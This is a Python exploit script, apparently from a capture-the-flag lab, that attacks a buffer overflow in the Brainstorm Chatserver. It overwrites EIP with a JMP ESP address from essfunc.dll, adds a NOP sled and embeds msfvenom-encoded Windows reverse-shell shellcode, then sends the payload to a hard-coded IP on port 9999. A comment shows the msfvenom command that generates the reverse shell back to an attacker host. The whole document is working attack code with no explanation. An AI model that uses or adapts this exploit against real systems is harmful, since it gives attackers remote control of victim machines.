#!/usr/bin/python3

"""
A buffer overflow exploit for the Brainstorm Chatserver.

Be sure to generate new shellcode and change the victim IP if necessary.
"""

import socket
import time

print("\nSending evil buffer...")

username = b"minus" + b"\x0a"
filler = b"A" * 2012
eip = b"\xdf\x14\x50\x62" # JMP ESP in essfunc.dll
nops = b"\x90" * 10
# msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=443 -e x86\shikata_ga_nai -b "\x00\x0a" -f py -v shellcode
shellcode =  b""
shellcode += b"\xbe\x69\x9a\x06\xb5\xda\xdb\xd9\x74\x24\xf4"
shellcode += b"\x58\x2b\xc9\xb1\x52\x31\x70\x12\x03\x70\x12"
shellcode += b"\x83\x81\x66\xe4\x40\xad\x7f\x6b\xaa\x4d\x80"
shellcode += b"\x0c\x22\xa8\xb1\x0c\x50\xb9\xe2\xbc\x12\xef"
shellcode += b"\x0e\x36\x76\x1b\x84\x3a\x5f\x2c\x2d\xf0\xb9"
shellcode += b"\x03\xae\xa9\xfa\x02\x2c\xb0\x2e\xe4\x0d\x7b"
shellcode += b"\x23\xe5\x4a\x66\xce\xb7\x03\xec\x7d\x27\x27"
shellcode += b"\xb8\xbd\xcc\x7b\x2c\xc6\x31\xcb\x4f\xe7\xe4"
shellcode += b"\x47\x16\x27\x07\x8b\x22\x6e\x1f\xc8\x0f\x38"
shellcode += b"\x94\x3a\xfb\xbb\x7c\x73\x04\x17\x41\xbb\xf7"
shellcode += b"\x69\x86\x7c\xe8\x1f\xfe\x7e\x95\x27\xc5\xfd"
shellcode += b"\x41\xad\xdd\xa6\x02\x15\x39\x56\xc6\xc0\xca"
shellcode += b"\x54\xa3\x87\x94\x78\x32\x4b\xaf\x85\xbf\x6a"
shellcode += b"\x7f\x0c\xfb\x48\x5b\x54\x5f\xf0\xfa\x30\x0e"
shellcode += b"\x0d\x1c\x9b\xef\xab\x57\x36\xfb\xc1\x3a\x5f"
shellcode += b"\xc8\xeb\xc4\x9f\x46\x7b\xb7\xad\xc9\xd7\x5f"
shellcode += b"\x9e\x82\xf1\x98\xe1\xb8\x46\x36\x1c\x43\xb7"
shellcode += b"\x1f\xdb\x17\xe7\x37\xca\x17\x6c\xc7\xf3\xcd"
shellcode += b"\x23\x97\x5b\xbe\x83\x47\x1c\x6e\x6c\x8d\x93"
shellcode += b"\x51\x8c\xae\x79\xfa\x27\x55\xea\x0f\xbe\x53"
shellcode += b"\xa3\x67\xbc\x5b\x32\xc3\x49\xbd\x5e\x23\x1c"
shellcode += b"\x16\xf7\xda\x05\xec\x66\x22\x90\x89\xa9\xa8"
shellcode += b"\x17\x6e\x67\x59\x5d\x7c\x10\xa9\x28\xde\xb7"
shellcode += b"\xb6\x86\x76\x5b\x24\x4d\x86\x12\x55\xda\xd1"
shellcode += b"\x73\xab\x13\xb7\x69\x92\x8d\xa5\x73\x42\xf5"
shellcode += b"\x6d\xa8\xb7\xf8\x6c\x3d\x83\xde\x7e\xfb\x0c"
shellcode += b"\x5b\x2a\x53\x5b\x35\x84\x15\x35\xf7\x7e\xcc"
shellcode += b"\xea\x51\x16\x89\xc0\x61\x60\x96\x0c\x14\x8c"
shellcode += b"\x27\xf9\x61\xb3\x88\x6d\x66\xcc\xf4\x0d\x89"
shellcode += b"\x07\xbd\x3e\xc0\x05\x94\xd6\x8d\xdc\xa4\xba"
shellcode += b"\x2d\x0b\xea\xc2\xad\xb9\x93\x30\xad\xc8\x96"
shellcode += b"\x7d\x69\x21\xeb\xee\x1c\x45\x58\x0e\x35"
buffer = filler + eip + nops + shellcode + b"\x0a"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("10.10.51.94", 9999)) # Change this
s.send(username)
time.sleep(2)
s.send(buffer)

s.close()

print("\nDone!")